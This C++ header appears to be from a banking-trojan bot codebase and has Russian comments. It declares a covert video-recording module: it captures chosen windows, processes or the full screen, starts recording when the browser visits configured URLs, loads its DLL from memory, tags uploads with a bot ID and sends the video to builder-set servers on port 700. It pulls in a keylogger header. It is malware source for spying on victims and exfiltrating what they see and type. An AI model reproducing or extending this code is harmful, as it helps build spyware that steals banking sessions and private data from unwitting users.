#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"
#include "DllLoader.h"


// Настройки парметров для билдера
#define VIDEOREC_PARAM_SIZE_HOST 50
#define VIDEOREC_PARAM_SIZE_URLS 3000

#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"

#define VIDEOREC_PARAM_ENCRYPTED_HOST false
#define VIDEOREC_PARAM_ENCRYPTED_URLS false


// порт сервера приёма видео
const DWORD VIDEORECORD_DEFAULT_PORT = 700;



static const int VIDEO_FULLSCREEN	= 0x0001; //полноэкранная запись
static const int VIDEO_ALWAYS		= 0x0002; //записывать всегда, даже если окно не активно


//****************************************************
//  TVideoRecDLL - класс для работы с библиотекой
//                 видеозаписи
//****************************************************
class TVideoRecDLL : public TBotObject
{
private:

	// определяем типы функци1
	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags ) ;
	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags );
	typedef VOID (WINAPI *TStopRec		)();
	typedef VOID (WINAPI *TResetTimer	)();

	typedef VOID (WINAPI *TStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
	//
	//
	HMEMORYMODULE FHandle;

	void InitializeApi();
	void LoadFunc(LPVOID *Addr, const char* Name);
public:
	TVideoRecDLL();
	~TVideoRecDLL();

	TStartRecHwnd     RecordWnd;
	TStartRecPid      RecordProcess;
	TStopRec          Stop;
	TResetTimer       ResetTimer;
	TStartSend        SendData;
};



//****************************************************
//
//****************************************************
class TVideoRecorder : public TBotObject
{
private:
	TVideoRecDLL FDLL;
public:
	string UID;        // Идентификатор бота
    string VideoName;  // имя видео
	string Server;     // Адрес основного сервера отправки видео
	string Server2;    // Адрес дополнителтьного сервера отправки видео
	int    Port;       // Порт основного сервера отправки видео
	int    Port2;      // Порт дополнительного сервера отправки видео
	int    RecordTime; // Время записи, в секундах

	TVideoRecorder();
	~TVideoRecorder();

	void RecordProcess(DWORD PID);
	void RecordCurrentProcess();
	void RecordWnd(HWND Wnd);
	void RecordScreen();
	void ResetTimer();
	void SendFiles(const char *Path);
	void Stop();
};



//Функция возвращает адрес сервера для записи видео
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();




namespace VideoRecorder
{
	//------------------------------------------------------------
	// RecordProcess - Функция запускает асинхронную видеозапись
	// указанного процесса.
	//
	// PID - Идентификатор указанного процесса. Если 0, то будет
	//       вестись запись текущего процесса
	//
	// VideoName - имя видеозаписи
	//------------------------------------------------------------
	void RecordProcess(DWORD PID, const char* VideoName);


	//------------------------------------------------------------
	// RecordWnd - Функция запускает ассинхронную запись видео с
	// указанного окна
	//
	// Wnd - Идентификатор окна
	// VideoName - Имя записи
	//------------------------------------------------------------
    void RecordWnd(HWND Wnd, const char* VideoName);

	//------------------------------------------------------------
	//  Функция остонавливает запись
	//------------------------------------------------------------
	void Stop();

	//------------------------------------------------------------
	//  VideoRecorderSendFiles - Функция отправляет файлы из
	//  указанной папки на сервер видеозаписи.
	//  Настройки берутся глобальные.
	//------------------------------------------------------------
	void SendFiles(PCHAR Path);
	void SendFiles(string const &Path);
}



//??????????????????????????????????????????
//шлем либо просто либо передавая функцию в поток, параметр для которого директория
DWORD WINAPI StartSendinThread(LPVOID Data);


//void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data);

void StartVideoFromCurrentURL();




//*********************************************************************
//  Методы сервера распределения записи видео
//  Назначение сервера - запись видео процесса из другого
//  специолизированного процесса
//*********************************************************************
namespace VideoRecorderSrv
{
	//-----------------------------------------------------
	// Start - Функция запускает сервер распределения
	//-----------------------------------------------------
	bool Start();

	//-----------------------------------------------------
	// StartRecording - Функция стартует запуск записи
	//					видео для текущего процесса
	//
	// URL - адрес сайт для которого инициализирована запись.
	//-----------------------------------------------------
	bool StartRecording(PCHAR URL);

	//-----------------------------------------------------
	//  StartInfiniteRecording - Функция запускает
	//  бесконечную запись в полноэкранном режиме
	//-----------------------------------------------------
	bool StartInfiniteRecording(const char* VideoName);

	//-----------------------------------------------------
	// StopRecording - Функция останавливает запуск записи
	//					видео для текущего процесса
	//-----------------------------------------------------
	bool StopRecording();

	//-----------------------------------------------------
	//  PingClient - Функция проверяет работает ли
	//               клиент записи с указанным PID
	//	Если PID равен 0 то будет проверяться текущий
	//  процесс
	//-----------------------------------------------------
	bool PingClient(DWORD PID);
}

//-----------------------------------------------------------------------------
#endif